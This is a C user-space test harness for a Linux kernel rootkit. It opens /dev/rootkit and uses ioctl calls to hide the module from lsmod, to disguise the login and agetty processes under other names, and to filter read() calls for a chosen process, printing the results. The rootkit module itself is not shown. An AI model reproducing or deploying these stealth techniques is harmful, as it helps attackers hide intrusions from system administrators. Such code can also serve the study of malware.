#include "shared_rootkit.h"
#include <fcntl.h>
#include <linux/sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>

const char *device = "/dev/rootkit";
const char *proc_name = "rootkit_test";
const char *test_file = "/mnt/test.txt";
const char *child_exec = "/mnt/rootkit_test_child";

void test_hide() {
  int fd = open(device, O_RDWR);
  if (fd < 0) {
    perror("open");
    return;
  }

  int ret = ioctl(fd, IOCTL_MOD_HIDE, 0);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  // checking lsmod output

  printf("first call should hide module...\n");
  system("lsmod");

  ret = ioctl(fd, IOCTL_MOD_HIDE, 0);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  // checking lsmod output
  printf("second call should unhide module...\n");
  system("lsmod");

  close(fd);
}

void test_masq() {
  int fd = open(device, O_RDWR);
  struct masq_proc_req req;
  req.len = 2;
  req.list = malloc(req.len * sizeof(struct masq_proc));
  strncpy(req.list[0].orig_name, "login", MASQ_LEN);
  strncpy(req.list[0].new_name, "felw", MASQ_LEN);
  strncpy(req.list[1].orig_name, "agetty", MASQ_LEN);
  strncpy(req.list[1].new_name, "shax", MASQ_LEN);

  printf("masquerading login and agetty processes... before\n");
  system("ps ao pid,comm");

  int ret = ioctl(fd, IOCTL_MOD_MASQ, &req);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  // checking lsmod output
  printf("call should masquerade processes...\n");
  system("ps ao pid,comm");

  free(req.list);
  close(fd);
}

void test_add_filter() { // testing filter of read()
  char buf[2];
  int fd = open(device, O_RDWR);
  int file_fd = open(test_file, O_RDONLY);
  struct filter_info info;

  info.syscall_nr = SYS_read;
  strncpy(info.comm, proc_name, TASK_FILTER_LEN);
  info.comm[TASK_FILTER_LEN - 1] = '\0';

  printf("adding filter for read syscall... before\n");
  if (read(file_fd, buf, 2) == 2) {
    buf[1] = '\0';
    printf("read() succeeded with content %s\n", buf);
  } else {
    perror("read() failed without filter");
  }

  int ret = ioctl(fd, IOCTL_ADD_FILTER, &info);
  if (ret < 0) {
    perror("ioctl");
    return;
  }

  printf("call should add filter for read syscall...\n");
  lseek(file_fd, 0, SEEK_SET);
  int n = read(file_fd, buf, 2);
  printf("read() returned %d\n", n);
  if (n < 0) {
    perror("read() failed with status code\n");
  } else {
    printf("read() succeeded with content %s\n", buf);
  }

  close(fd);
  close(file_fd);

  // execve child process to test filter
  pid_t pid = fork();
  if (pid == 0) {
    printf("executing child process...\n");
    execve(child_exec, NULL, NULL);
    perror("execl");
    exit(1);
  } else if (pid < 0) {
    perror("fork");
    return;
  }
}

int main() {
  printf("Testing IOCTL_MOD_HIDE\n=====================\n");
  test_hide();

  printf("\nTesting IOCTL_MOD_MASQ\n=====================\n");
  test_masq();

  printf("\nTesting IOCTL_ADD_FILTER\n=====================\n");
  test_add_filter();
}
